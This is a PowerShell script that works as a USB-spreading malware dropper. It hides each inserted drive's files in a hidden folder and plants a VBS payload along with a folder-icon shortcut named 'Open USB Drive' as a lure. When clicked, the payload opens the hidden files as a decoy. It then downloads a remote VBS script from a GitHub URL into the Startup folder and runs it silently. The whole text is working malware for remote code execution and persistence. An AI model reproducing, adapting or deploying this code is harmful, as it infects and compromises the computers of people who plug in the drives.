

$ErrorActionPreference = 'SilentlyContinue'

# ---------- Configuration ----------
$USB_FOLDER    = 'USB_Drive'           # hidden decoy folder (real files live here)
$MAX_SIZE      = 274877906944          # 256 GiB
$LNK_NAME      = 'Open USB Drive.lnk'  # visible lure in drive root
$SCAN_INTERVAL = 3                     # seconds between scans
$LOG_FILE      = Join-Path $env:TEMP 'usb_watch.log'
# -----------------------------------

function Write-Log($msg, $color = 'Gray') {
    $stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $line  = "[$stamp] $msg"
    Write-Host $line -ForegroundColor $color
    Add-Content -Path $LOG_FILE -Value $line -Encoding ASCII
}

# Clear R/H/S recursively on a path (dir or file)
function Clear-Attrs([string]$path) {
    if (Test-Path -LiteralPath $path -PathType Container) {
        & "$env:windir\System32\attrib.exe" -r -h -s "$path\*" /s /d 2>$null
    }
    & "$env:windir\System32\attrib.exe" -r -h -s "$path" 2>$null
}

function Move-Tree([string]$src, [string]$dst) {
    # Fast path: same-volume rename (instant)
    try {
        Move-Item -LiteralPath $src -Destination $dst -Force -ErrorAction Stop
        return $true
    } catch { }

    # Fallback: copy + delete (attributes, in-use handles, etc.)
    try {
        Clear-Attrs $src
        Copy-Item -LiteralPath $src -Destination $dst -Recurse -Force -ErrorAction Stop
        Clear-Attrs $src
        Remove-Item -LiteralPath $src -Recurse -Force -ErrorAction Stop
        return $true
    } catch {
        Write-Log "Move FAILED: $src -> $dst :: $($_.Exception.Message)" 'Red'
        return $false
    }
}

function Install-Drop($disk) {
    $root = "$($disk.DeviceID)\"
    $dest = Join-Path $root $USB_FOLDER
    Write-Log "New drive detected: $root ($([math]::Round($disk.Size/1GB,1)) GB)" 'Cyan'

    # Let the stick finish mounting
    Start-Sleep -Seconds 2
    if (-not (Test-Path -LiteralPath $root)) {
        Write-Log "$root disappeared before install, skipping" 'Yellow'
        return
    }

    # 1) MOVE the whole drive contents into USB_Drive
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
    Clear-Attrs $dest

    $failCount = 0
    Get-ChildItem -LiteralPath $root -Force | ForEach-Object {
        $name = $_.Name
        if ($name -eq $USB_FOLDER -or $name -eq 'System Volume Information' -or
            $name -eq '$RECYCLE.BIN' -or $name -eq $LNK_NAME) { return }

        $target = Join-Path $dest $name
        Clear-Attrs $_.FullName
        if (Test-Path -LiteralPath $target) { Clear-Attrs $target }   # overwrite stale dest

        if (Move-Tree $_.FullName $target) {
            Clear-Attrs $target
        } else {
            $failCount++
        }
    }

    if ($failCount -eq 0) {
        Write-Log "Move complete, no failures." 'Green'
    } else {
        Write-Log "Move finished with $failCount failure(s)." 'Yellow'
    }

    # 2) Random hidden payload folder (10 alnum chars)
    $randName  = -join ((97..122) + (48..57) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
    $hiddenDir = Join-Path $root $randName
    New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null

    # 3) VBS payload: opens USB_Drive (decoy), drops random file on Desktop
$vbs = @'
Option Explicit
Dim fso, ws, fs, out, scriptPath, driveLetter, usbFolder, startupFolder, downloader, url, targetFile

Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")

' --- 1. OPEN USB_FOLDER ---

scriptPath = WScript.ScriptFullName
driveLetter = fso.GetDriveName(scriptPath)
usbFolder = fso.BuildPath(driveLetter & "\", "USB_Drive")

If fso.FolderExists(usbFolder) Then
    ws.Run "explorer.exe """ & usbFolder & """", 1, False
Else
    WScript.Echo "Folder does not exist: " & usbFolder
End If

' --- 2. DOWNLOAD TO STARTUP ---

url = "https://raw.githubusercontent.com/Buff220/test123/refs/heads/main/usb/hello.vbs"
startupFolder = ws.SpecialFolders("Startup")
targetFile = fso.BuildPath(startupFolder, "payload.vbs")

Set downloader = CreateObject("MSXML2.XMLHTTP.6.0")
downloader.Open "GET", url, False
downloader.Send

If downloader.Status = 200 Then
    Set fs = fso   ' reuse the existing object instead of creating a new one
    Set out = fs.CreateTextFile(targetFile, True)
    out.Write downloader.responseText
    out.Close

    ' --- 3. EXECUTE THE DOWNLOADED VBS ---
    ws.Run "wscript.exe """ & targetFile & """", 0, False
Else
    WScript.Echo "Failed to download payload. Status: " & downloader.Status
End If

Set downloader = Nothing
'@
    $vbsPath = Join-Path $hiddenDir 'payload.vbs'
    
    Set-Content -Path $vbsPath -Value $vbs -Encoding ASCII

    # 4) Hide both folders (Hidden + System)
    & "$env:windir\System32\attrib.exe" +h +s $dest
    & "$env:windir\System32\attrib.exe" +h +s $hiddenDir

    # 5) LNK in drive root -> wscript.exe -> payload.vbs
    $ws  = New-Object -ComObject WScript.Shell
    $lnk = $ws.CreateShortcut((Join-Path $root $LNK_NAME))
    $lnk.TargetPath       = "$env:windir\System32\wscript.exe"
    $lnk.Arguments        = """$vbsPath"""
    $lnk.WorkingDirectory = $root
    $lnk.IconLocation     = "$env:windir\System32\shell32.dll,3"
    $lnk.Description      = 'Open USB Drive'
    $lnk.Save()

    Write-Log "OK: $dest / $hiddenDir / $root$LNK_NAME" 'Green'
}

# ---------- Main watcher loop ----------
Write-Log "USB watcher started (interval: ${SCAN_INTERVAL}s). PID: $PID" 'Yellow'
$processed = @{}   # DeviceID -> Size; re-plugs of the same stick are skipped

while ($true) {
    $drives = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" |
              Where-Object { $_.Size -and $_.Size -lt $MAX_SIZE }

    foreach ($d in $drives) {
        if (-not $processed.ContainsKey($d.DeviceID)) {
            $processed[$d.DeviceID] = $d.Size
            Install-Drop $d
        }
    }

    Start-Sleep -Seconds $SCAN_INTERVAL
}
